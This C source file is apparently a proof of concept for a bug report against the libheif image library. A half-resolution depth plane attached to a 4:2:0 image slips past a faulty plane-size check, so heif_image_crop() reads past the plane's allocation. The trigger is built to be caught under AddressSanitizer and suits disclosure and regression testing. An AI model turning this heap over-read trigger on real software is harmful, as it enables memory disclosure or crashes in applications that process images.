/*
 * PoC: heif_image_add_plane() documents that a plane "can be less [than the
 * image size] for subsampling", so an application attaching a half-resolution
 * depth map to a 4:2:0 YCbCr image and then cropping the image stays fully
 * inside the public API contract.
 *
 * HeifPixelImage::crop() guards its per-plane row copies with
 * has_standard_plane_sizes(), which is supposed to reject any plane whose
 * geometry does not match what its channel requires. For the depth data
 * channel the expected geometry is computed wrong, so the half-size depth
 * plane slips past the gate and crop() reads far past the end of the
 * 128x128 plane allocation while copying 256x256 worth of rows.
 *
 * Build (against an ASan build of libheif):
 *   cc pocs/newbug.c -I libheif -I <build-dir> -L <build-dir>/libheif -lheif \
 *      -fsanitize=address -o /tmp/newbug && /tmp/newbug
 */

#include <stdio.h>

#include <libheif/heif.h>


int main(void)
{
  heif_image* img = NULL;
  heif_error err;

  err = heif_image_create(256, 256, heif_colorspace_YCbCr, heif_chroma_420, &img);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "heif_image_create: %s\n", err.message);
    return 1;
  }

  /* regular 4:2:0 color planes */
  err = heif_image_add_plane(img, heif_channel_Y, 256, 256, 8);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "add_plane(Y): %s\n", err.message);
    return 1;
  }
  err = heif_image_add_plane(img, heif_channel_Cb, 128, 128, 8);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "add_plane(Cb): %s\n", err.message);
    return 1;
  }
  err = heif_image_add_plane(img, heif_channel_Cr, 128, 128, 8);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "add_plane(Cr): %s\n", err.message);
    return 1;
  }

  /* depth data channel at half resolution, as allowed for subsampled planes */
  err = heif_image_add_plane(img, heif_channel_depth, 128, 128, 8);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "add_plane(depth): %s\n", err.message);
    return 1;
  }

  /* crop away nothing, i.e. copy the whole 256x256 image */
  err = heif_image_crop(img, 0, 0, 0, 0);
  printf("heif_image_crop: code=%d subcode=%d message=%s\n",
         (int) err.code, (int) err.subcode, err.message);

  heif_image_release(img);
  return 0;
}
